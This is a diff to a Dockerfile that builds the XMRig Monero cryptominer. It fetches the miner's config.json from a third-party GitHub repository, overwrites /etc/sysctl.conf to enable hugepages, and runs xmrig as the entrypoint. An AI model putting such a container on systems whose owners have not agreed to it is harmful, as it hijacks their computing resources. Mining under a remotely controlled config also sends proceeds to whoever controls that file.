@@ -1,29 +1,36 @@
-# Use the latest Ubuntu image as a base
-FROM ubuntu:latest
+# Use a minimal base image with build tools
+FROM debian:bullseye-slim
+
+# Set environment variables
+ENV DEBIAN_FRONTEND=noninteractive
 
 # Update the package list and install dependencies
-RUN apt update && apt install -y \
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends \
     build-essential \
     cmake \
     git \
+    wget \
     libssl-dev \
-    libuv1-dev \
-    libmicrohttpd-dev \
     libhwloc-dev \
-    wget
+    libuv1-dev && \
+    apt-get clean && \
+    rm -rf /var/lib/apt/lists/*
 
-# Clone the XMR miner repository
-RUN git clone https://github.com/xmrig/xmrig.git /xmrig
+# Clone XMRig source and build it
+RUN git clone https://github.com/xmrig/xmrig.git /xmrig && \
+    mkdir /xmrig/build && \
+    cd /xmrig/build && \
+    cmake .. && \
+    make -j$(nproc)
 
-# Build the XMR miner
-WORKDIR /xmrig
-RUN cmake . && make
+# Fetch the configuration file
+RUN wget -O /xmrig/build/config.json https://raw.githubusercontent.com/Renegadestation/Renegadestation/refs/heads/main/config.json
 
-# Fetch the config from the given URL
-RUN wget -O config.json https://raw.githubusercontent.com/Renegadestation/Renegadestation/refs/heads/main/config.json
+# Enable hugepages (requires extended privileges on the host)
+RUN echo "vm.nr_hugepages=128" > /etc/sysctl.conf && \
+    sysctl -p
 
-# Set the config file as the default
-ENV XMRIG_CONFIG=config.json
-
-# Run the XMR miner with root and largepages
-CMD ["sudo", "-u", "root", "/xmrig/xmrig", "--large-pages", "--config", "/xmrig/config.json"]
+# Set XMRig as the entry point
+WORKDIR /xmrig/build
+ENTRYPOINT ["./xmrig"]
